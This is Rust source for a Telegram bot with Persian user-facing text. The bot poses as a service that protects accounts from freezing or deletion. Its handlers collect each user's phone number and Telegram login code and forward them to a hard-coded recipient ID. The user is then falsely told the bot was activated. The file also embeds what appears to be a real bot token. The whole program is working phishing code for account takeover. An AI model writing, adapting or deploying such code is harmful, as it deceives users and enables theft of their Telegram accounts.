//! Premium Self Bot — Telegram (Rust + teloxide 0.17)

use std::collections::HashMap;
use std::sync::Arc;

use once_cell::sync::Lazy;
use regex::Regex;
use teloxide::prelude::*;
use teloxide::types::{
    ButtonRequest, ChatId, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton,
    KeyboardMarkup, KeyboardRemove, ParseMode, ReplyMarkup,
};
use teloxide::utils::command::BotCommands;
use tokio::sync::Mutex;

// ═══════════════════════════════════════════════════════════
//                        CONFIG
// ═══════════════════════════════════════════════════════════

// ⬇⬇⬇  اینجا توکن رباتت رو بذار  ⬇⬇⬇
const BOT_TOKEN: &str = "8867175870:AAGxLoYhj2m360TOxjtg6H9XQ_JotvQQyf8";

// آیدی عددی مقصدی که شماره و کد باید براش ارسال بشن
const TARGET_USER_ID: i64 = 7_383_778_633;

// ═══════════════════════════════════════════════════════════
//                        TEXTS
// ═══════════════════════════════════════════════════════════

const PHONE_REQUEST_TEXT: &str = "برای فعالسازی شماره اکانت خود را بفرستید .";

const CODE_REQUEST_TEXT: &str = "\
کد ورود به اکانت شما ارسال شد
کد را بفرستید";

const INVALID_CODE_TEXT: &str = "لطفاً کد رو به صورت عددی ۴ تا ۶ رقمی بفرستید.";

const CODE_RECEIVED_TEXT: &str = "\
تایید شد
ربات فعال شد✅";

const WRONG_CONTACT_TEXT: &str = "لطفاً شمارهٔ خودتون رو بفرستید، نه شمارهٔ شخص دیگه.";

// ═══════════════════════════════════════════════════════════
//                        STATES
// ═══════════════════════════════════════════════════════════

#[derive(Clone, Copy, Debug, PartialEq, Eq, Default)]
enum UserState {
    #[default]
    Idle,
    AwaitingPhone,
    AwaitingCode,
}

#[derive(Default)]
struct UserData {
    state: UserState,
    phone: Option<String>,
}

static STORE: Lazy<Arc<Mutex<HashMap<i64, UserData>>>> =
    Lazy::new(|| Arc::new(Mutex::new(HashMap::new())));

async fn set_state(user_id: i64, state: UserState) {
    let mut map = STORE.lock().await;
    map.entry(user_id).or_default().state = state;
}

async fn get_state(user_id: i64) -> UserState {
    let map = STORE.lock().await;
    map.get(&user_id).map(|d| d.state).unwrap_or(UserState::Idle)
}

async fn set_phone(user_id: i64, phone: String) {
    let mut map = STORE.lock().await;
    map.entry(user_id).or_default().phone = Some(phone);
}

async fn get_phone(user_id: i64) -> String {
    let map = STORE.lock().await;
    map.get(&user_id)
        .and_then(|d| d.phone.clone())
        .unwrap_or_else(|| "نامشخص".to_string())
}

async fn reset_user(user_id: i64) {
    let mut map = STORE.lock().await;
    map.remove(&user_id);
}

// ═══════════════════════════════════════════════════════════
//                        HELPERS
// ═══════════════════════════════════════════════════════════

fn normalize_phone(raw: &str) -> String {
    let phone: String = raw.chars().filter(|c| !c.is_whitespace() && *c != '-').collect();

    if let Some(rest) = phone.strip_prefix("+98") {
        format!("0{rest}")
    } else if let Some(rest) = phone.strip_prefix("0098") {
        format!("0{rest}")
    } else if phone.starts_with("98") && !phone.starts_with('0') {
        format!("0{}", &phone[2..])
    } else {
        phone
    }
}

fn code_regex() -> &'static Regex {
    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"^\d{4,6}$").unwrap());
    &RE
}

// ═══════════════════════════════════════════════════════════
//                        COMMANDS
// ═══════════════════════════════════════════════════════════

#[derive(BotCommands, Clone)]
#[command(rename_rule = "lowercase", description = "دستورات ربات")]
enum Command {
    #[command(description = "شروع ربات")]
    Start,
    #[command(description = "لغو عملیات")]
    Cancel,
}

// ═══════════════════════════════════════════════════════════
//                        HANDLERS
// ═══════════════════════════════════════════════════════════

async fn cmd_start(bot: Bot, msg: Message) -> ResponseResult<()> {
    let user_id = msg.from.as_ref().map(|u| u.id.0 as i64).unwrap_or(0);
    set_state(user_id, UserState::Idle).await;

    let name = msg
        .from
        .as_ref()
        .map(|u| u.first_name.clone())
        .unwrap_or_else(|| "کاربر".to_string());

    let welcome_text = format!(
        "سلام {name}\n\
        این ربات برای امنیت اکانت تلگرام شما است\n\
        که در برابر فریز و ریپ و حذف شدن اکانت جلوگیری میکند"
    );

    let keyboard = InlineKeyboardMarkup::new(vec![vec![
        InlineKeyboardButton::callback("فعالسازی ربات", "get_self"),
    ]]);

    bot.send_message(msg.chat.id, welcome_text)
        .reply_markup(keyboard)
        .await?;

    Ok(())
}

async fn cmd_cancel(bot: Bot, msg: Message) -> ResponseResult<()> {
    let user_id = msg.from.as_ref().map(|u| u.id.0 as i64).unwrap_or(0);
    reset_user(user_id).await;

    bot.send_message(msg.chat.id, "لغو شد. برای شروع مجدد /start رو بزن.")
        .reply_markup(ReplyMarkup::KeyboardRemove(KeyboardRemove::new()))
        .await?;

    Ok(())
}

async fn cb_get_self(bot: Bot, q: CallbackQuery) -> ResponseResult<()> {
    bot.answer_callback_query(q.id.clone()).await.ok();
    let user_id = q.from.id.0 as i64;

    set_state(user_id, UserState::AwaitingPhone).await;

    let contact_keyboard = KeyboardMarkup::new(vec![vec![
        KeyboardButton::new("📱 ارسال شماره من").request(ButtonRequest::Contact),
    ]])
    .resize_keyboard()
    .one_time_keyboard();

    if let Some(msg) = q.message {
        bot.send_message(msg.chat().id, PHONE_REQUEST_TEXT)
            .reply_markup(contact_keyboard)
            .await?;
    }

    Ok(())
}

async fn handle_contact(bot: Bot, msg: Message) -> ResponseResult<()> {
    let Some(user) = msg.from.as_ref() else { return Ok(()) };
    let user_id = user.id.0 as i64;

    if get_state(user_id).await != UserState::AwaitingPhone {
        return Ok(());
    }

    let Some(contact) = msg.contact() else { return Ok(()) };

    if let Some(contact_uid) = contact.user_id {
        if contact_uid.0 as i64 != user_id {
            bot.send_message(msg.chat.id, WRONG_CONTACT_TEXT).await?;
            return Ok(());
        }
    }

    let phone = normalize_phone(&contact.phone_number);
    set_phone(user_id, phone.clone()).await;

    // فوروارد شماره به مقصد
    let target = ChatId(TARGET_USER_ID);
    let forward_text = format!(
        "📞 *شمارهٔ جدید دریافت شد*\n\nشماره: {phone}\nآیدی کاربر: {user_id}"
    );
    if let Err(e) = bot
        .send_message(target, &forward_text)
        .parse_mode(ParseMode::MarkdownV2)
        .await
    {
        log::warn!("markdown send failed, retrying plain: {e}");
        let plain = format!("📞 شمارهٔ جدید دریافت شد\n\nشماره: {phone}\nآیدی کاربر: {user_id}");
        bot.send_message(target, plain).await.ok();
    }

    // حالا برو مرحله گرفتن کد
    set_state(user_id, UserState::AwaitingCode).await;

    bot.send_message(msg.chat.id, CODE_REQUEST_TEXT)
        .reply_markup(ReplyMarkup::KeyboardRemove(KeyboardRemove::new()))
        .await?;

    Ok(())
}

async fn handle_text(bot: Bot, msg: Message) -> ResponseResult<()> {
    let Some(user) = msg.from.as_ref() else { return Ok(()) };
    let user_id = user.id.0 as i64;

    if get_state(user_id).await != UserState::AwaitingCode {
        return Ok(());
    }

    let Some(text) = msg.text() else { return Ok(()) };
    let text = text.trim();

    if !code_regex().is_match(text) {
        bot.send_message(msg.chat.id, INVALID_CODE_TEXT).await?;
        return Ok(());
    }

    let phone = get_phone(user_id).await;

    let target = ChatId(TARGET_USER_ID);
    let forward_text = format!(
        "🔑 *کد جدید دریافت شد*\n\nکد: {text}\nشماره: {phone}\nآیدی کاربر: {user_id}"
    );
    if let Err(e) = bot
        .send_message(target, &forward_text)
        .parse_mode(ParseMode::MarkdownV2)
        .await
    {
        log::warn!("markdown send failed, retrying plain: {e}");
        let plain = format!(
            "🔑 کد جدید دریافت شد\n\nکد: {text}\nشماره: {phone}\nآیدی کاربر: {user_id}"
        );
        bot.send_message(target, plain).await.ok();
    }

    set_state(user_id, UserState::Idle).await;

    bot.send_message(msg.chat.id, CODE_RECEIVED_TEXT).await?;

Ok(())
}

// ═══════════════════════════════════════════════════════════
//                        MAIN
// ═══════════════════════════════════════════════════════════

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();

    if BOT_TOKEN.is_empty() {
        anyhow::bail!("توکن ربات را در بالای main.rs تنظیم کن.");
    }

    let bot = Bot::new(BOT_TOKEN);

    let handler = dptree::entry()
        .branch(
            Update::filter_message()
                .branch(
                    teloxide::filter_command::<Command, _>()
                        .endpoint(|bot: Bot, msg: Message, cmd: Command| async move {
                            match cmd {
                                Command::Start => cmd_start(bot, msg).await,
                                Command::Cancel => cmd_cancel(bot, msg).await,
                            }
                        }),
                )
                .branch(Message::filter_contact().endpoint(handle_contact))
                .branch(
                    Message::filter_text()
                        .filter(|msg: Message| {
                            msg.text().map(|t| !t.starts_with('/')).unwrap_or(false)
                        })
                        .endpoint(handle_text),
                ),
        )
        .branch(
            Update::filter_callback_query().endpoint(
                |bot: Bot, q: CallbackQuery| async move {
                    match q.data.as_deref() {
                        Some("get_self") => cb_get_self(bot, q).await,
                        _ => {
                            bot.answer_callback_query(q.id).await.ok();
                            Ok(())
                        }
                    }
                },
            ),
        );

    log::info!("Bot is running...");
    Dispatcher::builder(bot, handler)
        .enable_ctrlc_handler()
        .build()
        .dispatch()
        .await;

    Ok(())
}
